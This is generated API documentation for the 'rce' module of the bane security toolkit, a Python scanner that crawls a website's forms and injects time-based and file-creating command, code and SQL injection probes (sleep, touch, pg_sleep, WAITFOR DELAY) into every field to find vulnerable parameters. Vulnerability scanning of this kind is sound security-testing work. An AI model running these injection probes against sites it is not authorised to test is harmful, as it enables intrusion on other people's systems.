<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.scanners.vulnerabilities.rce</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.scanners.vulnerabilities.utils import *

def rce_submit(
    parsed,
    payload,
    based_on,
    replaceble_parameters,
    debug=False,
    enctype=&#34;application/x-www-form-urlencoded&#34;,
    type_injection=&#34;code&#34;,
):
    &#34;&#34;&#34;&#34;&#34;&#34;
    p_o_c=parsed[0].copy()
    d, fi = setup_to_submit(parsed[0])
    for x in d:
        for y in replaceble_parameters:
            if x == y:
                for z in replaceble_parameters[y]:
                    d[x] = d[x].replace(z[0], z[1])
    if debug == True:
        for x in d:
            print(&#34;{}{} : {}{}&#34;.format(Fore.MAGENTA, x, Fore.WHITE, d[x]))
        for x in fi:
            print(&#34;{}{} : {}{}&#34;.format(Fore.MAGENTA, x, Fore.WHITE, fi[x]))
    if &#34;application/json&#34; in enctype:
        d = json.dumps(d)
    t = time.time()
    if not fi:
        parsed[1].update(
            {
                &#34;Content-Type&#34;: enctype,
                &#34;Referer&#34;: parsed[0][&#34;action&#34;],
                &#34;Origin&#34;: parsed[0][&#34;action&#34;].split(&#34;://&#34;)[0]
                + &#34;://&#34;
                + parsed[0][&#34;action&#34;].split(&#34;://&#34;)[1].split(&#34;/&#34;)[0],
            }
        )
    else:
        parsed[1].update(
            {
                &#34;Referer&#34;: parsed[0][&#34;action&#34;],
                &#34;Origin&#34;: parsed[0][&#34;action&#34;].split(&#34;://&#34;)[0]
                + &#34;://&#34;
                + parsed[0][&#34;action&#34;].split(&#34;://&#34;)[1].split(&#34;/&#34;)[0],
            }
        )
    c=&#39;&#39;
    if parsed[0][&#34;method&#34;] == &#34;get&#34;:
        try:
            c = requests.Session().get(
                parsed[0][&#34;action&#34;],
                params=d,
                headers=parsed[1],
                proxies=parsed[2],
                timeout=parsed[3],
                verify=False,
            )
            if based_on[0] == &#34;file&#34;:
                c = requests.Session().get(
                    parsed[0][&#34;action&#34;].replace(
                        parsed[0][&#34;action&#34;].split(&#34;/&#34;)[-1], based_on[1] + &#34;.txt&#34;
                    ),
                    params=d,
                    headers=parsed[1],
                    proxies=parsed[2],
                    timeout=parsed[3],
                    verify=False,
                )
                if (c.status_code == 200) and (len(c.text) == 0):
                    return (
                        True,
                        {&#34;reflection&#34;:parsed[0][&#34;action&#34;].replace(
                            parsed[0][&#34;action&#34;].split(&#34;/&#34;)[-1], based_on[1]
                        )
                        + &#34;.txt&#34;,&#34;p_o_c&#34;:p_o_c},
                        any(s in c.text for s in sql_errors),
                        any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c
                    )
            if based_on[0] == &#34;time&#34;:
                if type_injection == &#34;command&#34;:
                    if (int(time.time() - t) &gt;= based_on[1] - 2) or (
                        c.status_code == 504
                    ):
                        return (True, {&#34;p_o_c&#34;:p_o_c},any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)
                else:
                    if (int(time.time() - t) &gt;= based_on[1]) or (c.status_code == 504):
                        return (True, {&#34;p_o_c&#34;:p_o_c},any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)
        except Exception as e:
            #print(str(e))
            if &#34;Read timed out&#34; in str(e):
                #if based_on[0] == &#34;time&#34;:
                    return (True, {&#34;p_o_c&#34;:p_o_c},False,False,False,False)
    else:
        try:
            c = requests.Session().post(
                parsed[0][&#34;action&#34;],
                data=d,
                files=fi,
                headers=parsed[1],
                proxies=parsed[2],
                timeout=parsed[3],
                verify=False,
            )
            if based_on[0] == &#34;file&#34;:
                c = requests.Session().get(
                    parsed[0][&#34;action&#34;].replace(
                        parsed[0][&#34;action&#34;].split(&#34;/&#34;)[-1], based_on[1] + &#34;.txt&#34;
                    ),
                    params=d,
                    headers=parsed[1],
                    proxies=parsed[2],
                    timeout=parsed[3],
                    verify=False,
                )
                if (c.status_code == 200) and (len(c.text) == 0):
                    return (
                        True,
                        {&#34;reflection&#34;:parsed[0][&#34;action&#34;].replace(
                            parsed[0][&#34;action&#34;].split(&#34;/&#34;)[-1], based_on[1]
                        )
                        + &#34;.txt&#34;,&#34;p_o_c&#34;:p_o_c},
                        any(s in c.text for s in sql_errors),
                        any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c
                    )
            if based_on[0] == &#34;time&#34;:
                if (int(time.time() - t) &gt;= based_on[1] - 2) or (c.status_code == 504):
                    return (True, {&#34;p_o_c&#34;:p_o_c},any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)
                else:
                    if (int(time.time() - t) &gt;= based_on[1]) or (c.status_code == 504):
                        return (True, {&#34;p_o_c&#34;:p_o_c},any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)
        except Exception as e:
            #print(str(e))
            if &#34;Read timed out&#34; in str(e):
                #if based_on[0] == &#34;time&#34;:
                    return (True, {&#34;p_o_c&#34;:p_o_c},any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)
    return (False, &#34;&#34;,any(s in c.text for s in sql_errors),any(s in c.text for s in xml_parser_errors),any(s in c.text for s in fetch_url_errors),any(s in c.text for s in open_file_errors),p_o_c)


def rce_forms(
    u,
    payload_index=0,
    save_to_file=None,
    dont_change={},
    number=(1, 9),
    email_extension=&#39;@gmail.com&#39;,
    phone_pattern=&#39;XXX-XXX-XXXX&#39;,
    injection={&#34;code&#34;: &#34;php&#34;},
    code_operator_right=&#34;; &#34;,
    code_operator_left=&#34;&#34;,
    command_operator_right=&#34;|&#34;,
    command_operator_left=&#34;&amp;&#34;,
    sql_operator_right=&#34;or &#39;&#34;,
    sql_operator_left=&#34;&#39; or &#34;,
    file_extension=&#34;png&#34;,
    replaceble_parameters={&#34;phpvalue&#34;: ((&#34;.&#34;, &#34;&#34;),)},
    based_on=&#34;time&#34;,
    delay=10,
    logs=True,
    fill_empty=10,
    leave_empty=[],
    dont_send=[&#34;btnClear&#34;],
    proxy=None,
    proxies=None,
    timeout=120,
    user_agent=None,
    cookie=None,
    debug=False,
    mime_type=None,
    predefined_inputs={},
    headers={}
):
    &#34;&#34;&#34;
    this function is for RCE test with both POST and GET requests . it extracts the input fields names using the &#34;inputs&#34; function then test each input using POST and GET methods.

    usage:

    &gt;&gt;&gt;import bane
    &gt;&gt;&gt;bane.rce_forms(&#39;http://phptester.net/&#34;)

    &#34;&#34;&#34;
    payloads = {
        &#34;command&#34;: {
            &#34;linux&#34;: {
                &#34;file&#34;: [&#34;touch {}.txt&#34;, &#34;`touch {}.txt`&#34;, &#34;$(touch {}.txt)&#34;],
                &#34;time&#34;: [&#34;sleep {}&#34;, &#34;`sleep {}`&#34;, &#34;$(sleep {})&#34;],
            },
            &#34;windows&#34;: {&#34;file&#34;: [&#34;copy nul {}.txt&#34;], &#34;time&#34;: [&#34;ping -n {} 127.0.0.1&#34;]},
        },
        &#34;code&#34;: {
            &#34;python&#34;: {
                &#34;file&#34;: [&#34; open(&#39;{}.txt&#39;, &#39;w&#39;) &#34;],
                &#34;time&#34;: [&#34; __import__(&#39;time&#39;).sleep({}) &#34;],
            },
            &#34;php&#34;: {
                &#34;file&#34;: [&#34; file_put_contents(&#39;{}.txt&#39;, &#39;&#39;) &#34;],
                &#34;time&#34;: [&#34; sleep({}) &#34;],
            },
            &#34;ruby&#34;: {&#34;file&#34;: [&#39; File.new(&#34;{}.txt&#34;, &#34;w&#34;) &#39;], &#34;time&#34;: [&#34; sleep({}) &#34;]},
            &#34;perl&#34;: {
                &#34;file&#34;: [&#39; open ( my $fh, &#34;&gt;&#34;, &#34;{}.txt&#34;) &#39;],
                &#34;time&#34;: [&#34; sleep({}) &#34;],
            },
            &#34;js&#34;: {
                &#34;file&#34;: [&#34; require(&#39;fs&#39;).createWriteStream(&#39;{}.txt&#39;, {flags: &#39;w&#39;})  &#34;],
                &#34;time&#34;: [
                    &#34; (function wait(ms){var start = new Date().getTime();var end = start;while(end &lt; start + ms) {end = new Date().getTime();}})({}*1000) &#34;,
                    &#34; await (function wait(ms){var start = new Date().getTime();var end = start;while(end &lt; start + ms) {end = new Date().getTime();}})({}*1000) &#34;,
                ],
            },
        },
        &#34;sql&#34;: {
            &#34;mysql&#34;: {&#34;time&#34;: [&#34; sleep({}) &#34;]},
            &#34;oracle&#34;: {&#34;time&#34;: [&#34; dbms_lock.sleep({}) &#34;]},
            &#34;postgre&#34;: {&#34;time&#34;: [&#34; pg_sleep({}) &#34;]},
            &#34;sql_server&#34;: {&#34;time&#34;: [&#34; WAITFOR DELAY &#39;00:00:{}&#39; &#34;]},
        },
    }
    target_page = u
    xp = &#34;&#34;
    based_on_o = based_on
    if list(injection.keys())[0] == &#34;command&#34;:
        xp += command_operator_left
        inject_type = list(injection.keys())[0]
        inject_target = injection[inject_type]
        xp += payloads[inject_type.lower()][inject_target.lower()][based_on.lower()][
            payload_index
        ]
        if based_on_o.lower() == &#34;file&#34;:
            based_on = (&#34;file&#34;, random_string(random.randint(3, 10)))
        else:
            based_on = (&#34;time&#34;, int(delay) + 2)
        xp = xp.format(based_on[1])
        xp += command_operator_right
    elif list(injection.keys())[0] == &#34;code&#34;:
        xp += code_operator_left
        inject_type = list(injection.keys())[0]
        inject_target = injection[inject_type]
        xp += payloads[inject_type.lower()][inject_target.lower()][based_on.lower()][
            payload_index
        ]
        if based_on_o.lower() == &#34;file&#34;:
            based_on = (&#34;file&#34;, random_string(random.randint(3, 10)))
        else:
            based_on = (&#34;time&#34;, int(delay))
        xp = xp.format(based_on[1])
        xp += code_operator_right
    else:
        xp += sql_operator_left
        inject_type = list(injection.keys())[0]
        inject_target = injection[inject_type]
        xp += payloads[inject_type.lower()][inject_target.lower()][based_on.lower()][
            payload_index
        ]
        if based_on_o.lower() == &#34;file&#34;:
            based_on = (&#34;file&#34;, random_string(random.randint(3, 10)))
        else:
            based_on = (&#34;time&#34;, int(delay))
        xp = xp.format(based_on[1])
        xp += sql_operator_right
    target_page = u
    form_index = -1
    if proxy:
        proxy = proxy
    if proxies:
        proxy = random.choice(proxies)
    dic = []
    if logs == True:
        print(Fore.WHITE + &#34;[~]Getting forms...&#34; + Style.RESET_ALL)
    hu = True
    fom = forms_parser(
        u, proxy=proxy, timeout=timeout, cookie=cookie, user_agent=user_agent,include_links=True,headers=headers
    )
    if len(fom) == 0:
        if logs == True:
            print(Fore.RED + &#34;[-]No forms were found!!!&#34; + Style.RESET_ALL)
        hu = False
    if hu == True:
        for l1 in fom:
            form_index += 1
            lst = {}
            sql_e=[]
            xml_e=[]
            p_t_e=[]
            ssrf_e=[]
            p_t_erros=[]
            ssrf_errors=[]
            vul = []
            sec = []
            hu = True
            u = l1[&#34;action&#34;]
            if logs == True:
                print(
                    Fore.BLUE
                    + &#34;Form: &#34;
                    + Fore.WHITE
                    + str(form_index)
                    + Fore.BLUE
                    + &#34;\nAction: &#34;
                    + Fore.WHITE
                    + u
                    + Fore.BLUE
                    + &#34;\nMethod: &#34;
                    + Fore.WHITE
                    + l1[&#34;method&#34;]
                    + Fore.BLUE
                    + &#34;\nPayload: &#34;
                    + Fore.WHITE
                    + xp.replace(
                        &#34; {} &#34;.format(int(delay) + 2), &#34; {} &#34;.format(int(delay))
                    )
                    + Style.RESET_ALL
                )
                &#34;&#34;&#34;if len(inputs(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent))==0:
     if logs==True:
      print(Fore.YELLOW+&#34;[-]No parameters found on that page !! Moving on..&#34;+Style.RESET_ALL)&#34;&#34;&#34;
            if True:
                extr = []
                l = []
                for x in l1[&#34;inputs&#34;]:
                    if (
                        x[&#34;name&#34;].strip() not in leave_empty
                        and x[&#34;name&#34;].strip() not in dont_send
                    ):
                        try:
                            if (
                                x[&#34;type&#34;]
                                in [
                                    &#34;hidden&#34;,
                                    &#34;file&#34;,
                                    &#34;text&#34;,
                                    &#34;textarea&#34;,
                                    &#34;email&#34;,
                                    &#34;tel&#34;,
                                    &#34;search&#34;,
                                    &#34;url&#34;,
                                    &#34;password&#34;,
                                    &#34;number&#34;,
                                    &#34;select&#34;,
                                    &#34;radio&#34;,
                                    &#34;checkbox&#34;,
                                    &#34;color&#34;
                                ]
                                and x[&#34;name&#34;] not in dont_change
                            ):  # any input type that accept direct input from keyboard
                                i = x[&#34;name&#34;]
                                parsed_form = set_up_injection(
                                    target_page,
                                    form_index,
                                    i,
                                    xp,
                                    cookie,
                                    setup_ua(user_agent),
                                    setup_proxy(proxy, proxies),
                                    timeout,
                                    fill_empty,
                                    file_extension=file_extension,
                                    number=number,
                                    email_extension=email_extension,
                                    phone_pattern=phone_pattern,
                                    leave_empty=leave_empty,
                                    dont_send=dont_send,
                                    mime_type=mime_type,
                                    predefined_inputs=predefined_inputs,
                                    dont_change=dont_change,
                                    headers=headers
                                )
                                _res = rce_submit(
                                    parsed_form,
                                    xp,
                                    based_on,
                                    replaceble_parameters,
                                    debug=debug,
                                    enctype=l1[&#34;enctype&#34;],
                                    type_injection=list(injection.keys())[0],
                                )
                                if _res[0] == True:
                                    x = &#34;parameter: &#39;&#34; + i + &#34;&#39; =&gt; [+] Vulnerable !!&#34;
                                    vul.append({&#39;parameter&#39;:i, &#39;context&#39;: _res[1]})
                                    colr = Fore.GREEN
                                else:
                                    x = &#34;parameter: &#39;&#34; + i + &#34;&#39; =&gt; [-] Not Vulnerable&#34;
                                    #sec.append(i)
                                    colr = Fore.RED
                                if _res[2] == True:
                                    x+=Fore.YELLOW+&#34;\n[i] SQL Error detected&#34;
                                    sql_e.append({&#39;parameter&#39;:i, &#39;p_o_c&#39;: _res[-1]})
                                if _res[3]==True:
                                    x+=Fore.YELLOW+&#34;\n[i] XML parsing Error detected&#34;
                                    xml_e.append({&#39;parameter&#39;:i, &#39;p_o_c&#39;: _res[-1]})
                                if _res[4] == True:
                                    x+=Fore.YELLOW+&#34;\n[i] Fetching URL Error detected (potential SSRF)&#34;
                                    ssrf_e.append({&#39;parameter&#39;:i, &#39;p_o_c&#39;: _res[-1]})
                                if _res[5] == True:
                                    x+=Fore.YELLOW+&#34;\n[i] Reading file Error detected (potential path traversal)&#34;
                                    p_t_e.append({&#39;parameter&#39;:i, &#39;p_o_c&#39;: _res[-1]})
                                if logs == True:
                                    print(colr + x + Style.RESET_ALL)
                        except Exception as ex:
                            pass#raise(ex)
            dic.append(
                {
                    &#34;action&#34;: u,
                    &#34;method&#34;: l1[&#34;method&#34;],
                    &#34;vulnerable&#34;: vul,
                    #&#34;safe&#34;: sec,
                    &#34;sql_errors&#34;:sql_e,
                    &#34;xml_parsing_errors&#34;:xml_e,
                    &#34;fetching_url_errors&#34;:ssrf_e,
                    &#34;reading_file_errors&#34;:p_t_e
                }
            )
        if based_on_o == &#34;time&#34;:
            final = {
                &#34;payload&#34;: xp.replace(
                    &#34; {} &#34;.format(int(delay) + 2), &#34; {} &#34;.format(int(delay))
                ),
                &#34;based_on&#34;: based_on_o,
                &#34;injection&#34;: injection,
                &#34;page&#34;: target_page,
                &#34;result&#34;: dic,
            }
        else:
            final = {
                &#34;payload&#34;: xp,
                &#34;based_on&#34;: based_on_o,
                &#34;injection&#34;: injection,
                &#34;page&#34;: target_page,
                &#34;result&#34;: dic,
            }
        if save_to_file:
            with open(save_to_file.split(&#34;.&#34;)[0] + &#34;.json&#34;, &#34;w&#34;) as outfile:
                json.dump(final, outfile, indent=4)
            outfile.close()
        return final



def rce(
    u,
    max_pages=5,
    pages=[],
    payload_index=0,
    email_extension=&#39;@gmail.com&#39;,
    phone_pattern=&#39;XXX-XXX-XXXX&#39;,
    save_to_file=None,
    dont_change={},
    number=(1, 9),
    injection={&#34;code&#34;: &#34;php&#34;},
    code_operator_right=&#34;; &#34;,
    code_operator_left=&#34;&#34;,
    command_operator_right=&#34;|&#34;,
    command_operator_left=&#34;&amp;&#34;,
    sql_operator_right=&#34;or &#39;&#34;,
    sql_operator_left=&#34;&#39; or &#34;,
    file_extension=&#34;png&#34;,
    replaceble_parameters={&#34;phpvalue&#34;: ((&#34;.&#34;, &#34;&#34;),)},
    based_on=&#34;time&#34;,
    delay=10,
    logs=True,
    fill_empty=10,
    leave_empty=[],
    dont_send=[&#34;btnClear&#34;],
    proxy=None,
    proxies=None,
    timeout=120,
    user_agent=None,
    cookie=None,
    debug=False,
    mime_type=None,
    predefined_inputs={},
    headers={}
):
    l=[]
    if pages==[]:
        pages=spider_url(u,cookie=cookie,max_pages=max_pages,timeout=timeout,user_agent=user_agent,proxy=proxy,headers=headers)
    for x in pages:
        if logs==True:
            print(&#39;\n\nPage: {}\n&#39;.format(x))
        l.append(rce_forms(x,
                            payload_index=payload_index,
                            save_to_file=save_to_file,
                            dont_change=dont_change,
                            number=number,
                            email_extension=email_extension,
                            phone_pattern=phone_pattern,
                            injection=injection,
                            code_operator_right=code_operator_right,
                            code_operator_left=code_operator_left,
                            command_operator_right=command_operator_right,
                            command_operator_left=command_operator_left,
                            sql_operator_right=sql_operator_right,
                            sql_operator_left=sql_operator_left,
                            file_extension=file_extension,
                            replaceble_parameters=replaceble_parameters,
                            based_on=based_on,
                            delay=delay,
                            logs=logs,
                            fill_empty=fill_empty,
                            leave_empty=leave_empty,
                            dont_send=dont_send,
                            proxy=proxy,
                            proxies=proxies,
                            timeout=timeout,
                            user_agent=user_agent,
                            cookie=cookie,
                            debug=debug,
                            mime_type=mime_type,
                            predefined_inputs=predefined_inputs,
                            headers=headers))
    f=[]
    for x in l:
        if x !=None:
            n=x.copy()
            n[&#39;result&#39;]=[]
            for i in x[&#39;result&#39;]:
                if len(i[&#39;vulnerable&#39;]) &gt; 0 or len(i[&#39;sql_errors&#39;]) &gt; 0 or len(i[&#39;xml_parsing_errors&#39;])&gt;0 or len(i[&#39;fetching_url_errors&#39;])&gt;0 or len(i[&#39;reading_file_errors&#39;]) &gt; 0:
                    n[&#39;result&#39;].append(i)
            if n[&#39;result&#39;]!=[]:
                f.append(n)
    return f</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-functions">Functions</h2>
<dl>
<dt id="bane.scanners.vulnerabilities.rce.rce"><code class="name flex">
<span>def <span class="ident">rce</span></span>(<span>u, max_pages=5, pages=[], payload_index=0, email_extension='@gmail.com', phone_pattern='XXX-XXX-XXXX', save_to_file=None, dont_change={}, number=(1, 9), injection={'code': 'php'}, code_operator_right='; ', code_operator_left='', command_operator_right='|', command_operator_left='&', sql_operator_right="or '", sql_operator_left="' or ", file_extension='png', replaceble_parameters={'phpvalue': (('.', ''),)}, based_on='time', delay=10, logs=True, fill_empty=10, leave_empty=[], dont_send=['btnClear'], proxy=None, proxies=None, timeout=120, user_agent=None, cookie=None, debug=False, mime_type=None, predefined_inputs={}, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def rce(
    u,
    max_pages=5,
    pages=[],
    payload_index=0,
    email_extension=&#39;@gmail.com&#39;,
    phone_pattern=&#39;XXX-XXX-XXXX&#39;,
    save_to_file=None,
    dont_change={},
    number=(1, 9),
    injection={&#34;code&#34;: &#34;php&#34;},
    code_operator_right=&#34;; &#34;,
    code_operator_left=&#34;&#34;,
    command_operator_right=&#34;|&#34;,
    command_operator_left=&#34;&amp;&#34;,
    sql_operator_right=&#34;or &#39;&#34;,
    sql_operator_left=&#34;&#39; or &#34;,
    file_extension=&#34;png&#34;,
    replaceble_parameters={&#34;phpvalue&#34;: ((&#34;.&#34;, &#34;&#34;),)},
    based_on=&#34;time&#34;,
    delay=10,
    logs=True,
    fill_empty=10,
    leave_empty=[],
    dont_send=[&#34;btnClear&#34;],
    proxy=None,
    proxies=None,
    timeout=120,
    user_agent=None,
    cookie=None,
    debug=False,
    mime_type=None,
    predefined_inputs={},
    headers={}
):
    l=[]
    if pages==[]:
        pages=spider_url(u,cookie=cookie,max_pages=max_pages,timeout=timeout,user_agent=user_agent,proxy=proxy,headers=headers)
    for x in pages:
        if logs==True:
            print(&#39;\n\nPage: {}\n&#39;.format(x))
        l.append(rce_forms(x,
                            payload_index=payload_index,
                            save_to_file=save_to_file,
                            dont_change=dont_change,
                            number=number,
                            email_extension=email_extension,
                            phone_pattern=phone_pattern,
                            injection=injection,
                            code_operator_right=code_operator_right,
                            code_operator_left=code_operator_left,
                            command_operator_right=command_operator_right,
                            command_operator_left=command_operator_left,
                            sql_operator_right=sql_operator_right,
                            sql_operator_left=sql_operator_left,
                            file_extension=file_extension,
                            replaceble_parameters=replaceble_parameters,
                            based_on=based_on,
                            delay=delay,
                            logs=logs,
                            fill_empty=fill_empty,
                            leave_empty=leave_empty,
                            dont_send=dont_send,
                            proxy=proxy,
                            proxies=proxies,
                            timeout=timeout,
                            user_agent=user_agent,
                            cookie=cookie,
                            debug=debug,
                            mime_type=mime_type,
                            predefined_inputs=predefined_inputs,
                            headers=headers))
    f=[]
    for x in l:
        if x !=None:
            n=x.copy()
            n[&#39;result&#39;]=[]
            for i in x[&#39;result&#39;]:
                if len(i[&#39;vulnerable&#39;]) &gt; 0 or len(i[&#39;sql_errors&#39;]) &gt; 0 or len(i[&#39;xml_parsing_errors&#39;])&gt;0 or len(i[&#39;fetching_url_errors&#39;])&gt;0 or len(i[&#39;reading_file_errors&#39;]) &gt; 0:
                    n[&#39;result&#39;].append(i)
            if n[&#39;result&#39;]!=[]:
                f.append(n)
    return f</code></pre>
</details>
</dd>
<dt id="bane.scanners.vulnerabilities.rce.rce_forms"><code class="name flex">
<span>def <span class="ident">rce_forms</span></span>(<span>u, payload_index=0, save_to_file=None, dont_change={}, number=(1, 9), email_extension='@gmail.com', phone_pattern='XXX-XXX-XXXX', injection={'code': 'php'}, code_operator_right='; ', code_operator_left='', command_operator_right='|', command_operator_left='&', sql_operator_right="or '", sql_operator_left="' or ", file_extension='png', replaceble_parameters={'phpvalue': (('.', ''),)}, based_on='time', delay=10, logs=True, fill_empty=10, leave_empty=[], dont_send=['btnClear'], proxy=None, proxies=None, timeout=120, user_agent=None, cookie=None, debug=False, mime_type=None, predefined_inputs={}, headers={})</span>
</code></dt>
<dd>
<div class="desc"><p>this function is for RCE test with both POST and GET requests . it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.</p>
<p>usage:</p>
<blockquote>
<blockquote>
<blockquote>
<p>import bane
bane.rce_forms('http://phptester.net/")</p>
</blockquote>
</blockquote>
</blockquote></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def rce_forms(
    u,
    payload_index=0,
    save_to_file=None,
    dont_change={},
    number=(1, 9),
    email_extension=&#39;@gmail.com&#39;,
    phone_pattern=&#39;XXX-XXX-XXXX&#39;,
    injection={&#34;code&#34;: &#34;php&#34;},
    code_operator_right=&#34;; &#34;,
    code_operator_left=&#34;&#34;,
    command_operator_right=&#34;|&#34;,
    command_operator_left=&#34;&amp;&#34;,
    sql_operator_right=&#34;or &#39;&#34;,
    sql_operator_left=&#34;&#39; or &#34;,
    file_extension=&#34;png&#34;,
    replaceble_parameters={&#34;phpvalue&#34;: ((&#34;.&#34;, &#34;&#34;),)},
    based_on=&#34;time&#34;,
    delay=10,
    logs=True,
    fill_empty=10,
    leave_empty=[],
    dont_send=[&#34;btnClear&#34;],
    proxy=None,
    proxies=None,
    timeout=120,
    user_agent=None,
    cookie=None,
    debug=False,
    mime_type=None,
    predefined_inputs={},
    headers={}
):
    &#34;&#34;&#34;
    this function is for RCE test with both POST and GET requests . it extracts the input fields names using the &#34;inputs&#34; function then test each input using POST and GET methods.

    usage:

    &gt;&gt;&gt;import bane
    &gt;&gt;&gt;bane.rce_forms(&#39;http://phptester.net/&#34;)

    &#34;&#34;&#34;
    payloads = {
        &#34;command&#34;: {
            &#34;linux&#34;: {
                &#34;file&#34;: [&#34;touch {}.txt&#34;, &#34;`touch {}.txt`&#34;, &#34;$(touch {}.txt)&#34;],
                &#34;time&#34;: [&#34;sleep {}&#34;, &#34;`sleep {}`&#34;, &#34;$(sleep {})&#34;],
            },
            &#34;windows&#34;: {&#34;file&#34;: [&#34;copy nul {}.txt&#34;], &#34;time&#34;: [&#34;ping -n {} 127.0.0.1&#34;]},
        },
        &#34;code&#34;: {
            &#34;python&#34;: {
                &#34;file&#34;: [&#34; open(&#39;{}.txt&#39;, &#39;w&#39;) &#34;],
                &#34;time&#34;: [&#34; __import__(&#39;time&#39;).sleep({}) &#34;],
            },
            &#34;php&#34;: {
                &#34;file&#34;: [&#34; file_put_contents(&#39;{}.txt&#39;, &#39;&#39;) &#34;],
                &#34;time&#34;: [&#34; sleep({}) &#34;],
            },
            &#34;ruby&#34;: {&#34;file&#34;: [&#39; File.new(&#34;{}.txt&#34;, &#34;w&#34;) &#39;], &#34;time&#34;: [&#34; sleep({}) &#34;]},
            &#34;perl&#34;: {
                &#34;file&#34;: [&#39; open ( my $fh, &#34;&gt;&#34;, &#34;{}.txt&#34;) &#39;],
                &#34;time&#34;: [&#34; sleep({}) &#34;],
            },
            &#34;js&#34;: {
                &#34;file&#34;: [&#34; require(&#39;fs&#39;).createWriteStream(&#39;{}.txt&#39;, {flags: &#39;w&#39;})  &#34;],
                &#34;time&#34;: [
                    &#34; (function wait(ms){var start = new Date().getTime();var end = start;while(end &lt; start + ms) {end = new Date().getTime();}})({}*1000) &#34;,
                    &#34; await (function wait(ms){var start = new Date().getTime();var end = start;while(end &lt; start + ms) {end = new Date().getTime();}})({}*1000) &#34;,
                ],
            },
        },
        &#34;sql&#34;: {
            &#34;mysql&#34;: {&#34;time&#34;: [&#34; sleep({}) &#34;]},
            &#34;oracle&#34;: {&#34;time&#34;: [&#34; dbms_lock.sleep({}) &#34;]},
            &#34;postgre&#34;: {&#34;time&#34;: [&#34; pg_sleep({}) &#34;]},
            &#34;sql_server&#34;: {&#34;time&#34;: [&#34; WAITFOR DELAY &#39;00:00:{}&#39; &#34;]},
        },
    }
    target_page = u
    xp = &#34;&#34;
    based_on_o = based_on
    if list(injection.keys())[0] == &#34;command&#34;:
        xp += command_operator_left
        inject_type = list(injection.keys())[0]
        inject_target = injection[inject_type]
        xp += payloads[inject_type.lower()][inject_target.lower()][based_on.lower()][
            payload_index
        ]
        if based_on_o.lower() == &#34;file&#34;:
            based_on = (&#34;file&#34;, random_string(random.randint(3, 10)))
        else:
            based_on = (&#34;time&#34;, int(delay) + 2)
        xp = xp.format(based_on[1])
        xp += command_operator_right
    elif list(injection.keys())[0] == &#34;code&#34;:
        xp += code_operator_left
        inject_type = list(injection.keys())[0]
        inject_target = injection[inject_type]
        xp += payloads[inject_type.lower()][inject_target.lower()][based_on.lower()][
            payload_index
        ]
        if based_on_o.lower() == &#34;file&#34;:
            based_on = (&#34;file&#34;, random_string(random.randint(3, 10)))
        else:
            based_on = (&#34;time&#34;, int(delay))
        xp = xp.format(based_on[1])
        xp += code_operator_right
    else:
        xp += sql_operator_left
        inject_type = list(injection.keys())[0]
        inject_target = injection[inject_type]
        xp += payloads[inject_type.lower()][inject_target.lower()][based_on.lower()][
            payload_index
        ]
        if based_on_o.lower() == &#34;file&#34;:
            based_on = (&#34;file&#34;, random_string(random.randint(3, 10)))
        else:
            based_on = (&#34;time&#34;, int(delay))
        xp = xp.format(based_on[1])
        xp += sql_operator_right
    target_page = u
    form_index = -1
    if proxy:
        proxy = proxy
    if proxies:
        proxy = random.choice(proxies)
    dic = []
    if logs == True:
        print(Fore.WHITE + &#34;[~]Getting forms...&#34; + Style.RESET_ALL)
    hu = True
    fom = forms_parser(
        u, proxy=proxy, timeout=timeout, cookie=cookie, user_agent=user_agent,include_links=True,headers=headers
    )
    if len(fom) == 0:
        if logs == True:
            print(Fore.RED + &#34;[-]No forms were found!!!&#34; + Style.RESET_ALL)
        hu = False
    if hu == True:
        for l1 in fom:
            form_index += 1
            lst = {}
            sql_e=[]
            xml_e=[]
            p_t_e=[]
            ssrf_e=[]
            p_t_erros=[]
            ssrf_errors=[]
            vul = []
            sec = []
            hu = True
            u = l1[&#34;action&#34;]
            if logs == True:
                print(
                    Fore.BLUE
                    + &#34;Form: &#34;
                    + Fore.WHITE
                    + str(form_index)
                    + Fore.BLUE
                    + &#34;\nAction: &#34;
                    + Fore.WHITE
                    + u
                    + Fore.BLUE
                    + &#34;\nMethod: &#34;
                    + Fore.WHITE
                    + l1[&#34;method&#34;]
                    + Fore.BLUE
                    + &#34;\nPayload: &#34;
                    + Fore.WHITE
                    + xp.replace(
                        &#34; {} &#34;.format(int(delay) + 2), &#34; {} &#34;.format(int(delay))
                    )
                    + Style.RESET_ALL
                )
                &#34;&#34;&#34;if len(inputs(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent))==0:
     if logs==True:
      print(Fore.YELLOW+&#34;[-]No parameters found on that page !! Moving on..&#34;+Style.RESET_ALL)&#34;&#34;&#34;
            if True:
                extr = []
                l = []
                for x in l1[&#34;inputs&#34;]:
                    if (
                        x[&#34;name&#34;].strip() not in leave_empty
                        and x[&#34;name&#34;].strip() not in dont_send
                    ):
                        try:
                            if (
                                x[&#34;type&#34;]
                                in [
                                    &#34;hidden&#34;,
                                    &#34;file&#34;,
                                    &#34;text&#34;,
                                    &#34;textarea&#34;,
                                    &#34;email&#34;,
